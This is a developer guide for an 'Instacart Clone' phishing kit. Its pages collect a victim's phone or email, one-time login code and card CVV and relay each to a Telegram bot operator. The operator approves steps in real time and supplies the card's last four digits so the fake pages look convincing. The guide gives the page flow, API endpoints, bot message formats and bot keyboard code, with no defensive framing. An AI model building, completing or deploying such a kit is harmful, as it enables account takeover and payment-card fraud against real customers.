# Instacart Clone - Telegram Bot Integration Guide

## Overview

This system uses a loading page pattern where each user action requires validation from a Telegram bot operator before proceeding to the next step.

## Complete Flow

### 1. Phone/Email Entry
**Page**: `index.html`
- User enters phone or email
- Clicks "Continue"
- **→ Redirects to**: `loading.html?step=phone&contact={contact}&type={email|phone}`

### 2. Loading Page (Phone Validation)
**Page**: `loading.html?step=phone`
- Shows loading spinner
- **API Call**: Polls `/api/check-status?session={sessionId}&step=phone`
- **Telegram Bot**: Receives phone/email, operator clicks "Approve" or "Reject"
- **If Approved**: `verify.html?session={sessionId}`
- **If Rejected**: Back to `index.html`

### 3. Verification Code Entry
**Page**: `verify.html`
- User enters 6-digit code
- **→ Redirects to**: `loading.html?step=code&code={code}`

### 4. Loading Page (Code Validation)
**Page**: `loading.html?step=code`
- Shows loading spinner
- **API Call**: Polls `/api/check-status?session={sessionId}&step=code`
- **Telegram Bot**: Receives code, operator enters last 4 digits of card and clicks "Approve"
- **If Approved**: `card-confirm.html?card={last4}&session={sessionId}`
- **If Rejected**: Back to `verify.html`

### 5. Card CVV Entry
**Page**: `card-confirm.html`
- Shows "card ending in {last4}" (from telegram bot)
- User enters 3-digit CVV
- **→ Redirects to**: `loading.html?step=card&cvv={cvv}&card={last4}`

### 6. Loading Page (CVV Validation)
**Page**: `loading.html?step=card`
- Shows loading spinner
- **API Call**: Polls `/api/check-status?session={sessionId}&step=card`
- **Telegram Bot**: Receives CVV, operator clicks "Approve" or "Reject"
- **If Approved**: `thankyou.html?session={sessionId}`
- **If Rejected**: Back to `card-confirm.html`

### 7. Thank You Page
**Page**: `thankyou.html`
- Shows success message
- "Account verified!"
- User can start shopping

---

## API Endpoints Required

### POST `/api/submit-data`
Submit user data to Telegram bot

**Request Body**:
```json
{
  "session": "sess_1234567890_abc",
  "step": "phone|code|card",
  "data": {
    "contact": "user@email.com",
    "type": "email",
    "code": "123456",
    "cvv": "123",
    "cardLast4": "1234"
  }
}
```

**Response**:
```json
{
  "success": true,
  "session": "sess_1234567890_abc",
  "message": "Data sent to operator"
}
```

---

### GET `/api/check-status`
Check if operator has approved/rejected

**Query Params**:
- `session`: Session ID
- `step`: Current step (phone|code|card)

**Response (Pending)**:
```json
{
  "approved": false,
  "rejected": false,
  "pending": true
}
```

**Response (Approved)**:
```json
{
  "approved": true,
  "rejected": false,
  "cardLast4": "1234"  // Only for 'code' step
}
```

**Response (Rejected)**:
```json
{
  "approved": false,
  "rejected": true,
  "reason": "Invalid information"
}
```

---

## Telegram Bot Message Format

### Step 1: Phone/Email Submitted

```
🔔 New Login Attempt

📧 Contact: user@email.com
📱 Type: Email
🆔 Session: sess_1234567890_abc
⏰ Time: 2026-03-05 14:30:25

[✅ Approve] [❌ Reject]
```

**When operator clicks "Approve"**:
- Update message: "✅ Approved by @operator at 14:31:02"
- Send API response: `{ "approved": true }`
- Web user redirects to verify.html

---

### Step 2: Verification Code Submitted

```
🔢 Verification Code Received

📧 Contact: user@email.com
🔑 Code: 123456
🆔 Session: sess_1234567890_abc
⏰ Time: 2026-03-05 14:31:45

Please enter the last 4 digits of the card:
[Text Input]

[✅ Approve] [❌ Reject]
```

**When operator enters "1234" and clicks "Approve"**:
- Update message: "✅ Approved by @operator at 14:32:15\n💳 Card: ****1234"
- Send API response: `{ "approved": true, "cardLast4": "1234" }`
- Web user redirects to card-confirm.html with card=1234

---

### Step 3: CVV Submitted

```
💳 Card CVV Received

💳 Card: ****1234
🔒 CVV: 123
🆔 Session: sess_1234567890_abc
⏰ Time: 2026-03-05 14:33:10

[✅ Approve] [❌ Reject]
```

**When operator clicks "Approve"**:
- Update message: "✅ Approved by @operator at 14:33:25"
- Send API response: `{ "approved": true }`
- Web user redirects to thankyou.html

---

## Implementation Notes

### Session Management
- Generate unique session ID for each flow
- Store session data on backend
- Associate all actions with session ID

### Polling Strategy
- Poll every 1 second from loading page
- Timeout after 120 seconds (2 minutes)
- Show timeout message and redirect to start

### Telegram Bot Keyboard Layout

**Inline Keyboard Buttons**:
```python
keyboard = [
    [
        InlineKeyboardButton("✅ Approve", callback_data=f"approve_{session_id}_{step}"),
        InlineKeyboardButton("❌ Reject", callback_data=f"reject_{session_id}_{step}")
    ]
]
```

**For code step with input**:
Use Force Reply or conversation handler to get card last 4 digits before showing buttons.

### Security Considerations
- Validate all inputs server-side
- Use HTTPS for all API calls
- Implement rate limiting
- Log all operator actions
- Encrypt sensitive data in transit and at rest

---

## Testing

### Demo Mode
Currently the loading page auto-approves after 3 seconds for testing.

**To test full flow**:
1. Remove the simulation code in `loading.js`
2. Implement real API endpoints
3. Connect Telegram bot
4. Test each step

### Test Data
- Phone: Any 10+ digit number
- Code: Any 6 digits
- CVV: Any 3 digits
- Card Last 4: Entered by operator in Telegram

---

## File Structure

```
instacart/
├── index.html          # Login page
├── verify.html         # Verification code page
├── card-confirm.html   # CVV confirmation page
├── loading.html        # Loading/waiting page
├── thankyou.html       # Success page
├── styles.css          # Shared styles
├── verify.css          # Verify page styles
├── card-confirm.css    # Card confirm styles
├── loading.css         # Loading page styles
├── thankyou.css        # Thank you page styles
├── script.js           # Login logic
├── verify.js           # Verify logic
├── card-confirm.js     # Card confirm logic
├── loading.js          # Loading & polling logic
└── thankyou.js         # Thank you logic
```

---

## Next Steps

1. **Backend API**: Create the `/api/submit-data` and `/api/check-status` endpoints
2. **Telegram Bot**: Create bot with inline keyboards and message editing
3. **Database**: Store sessions, user data, and operator actions
4. **Webhooks**: Use webhooks instead of polling (more efficient)
5. **Security**: Add authentication, encryption, and validation
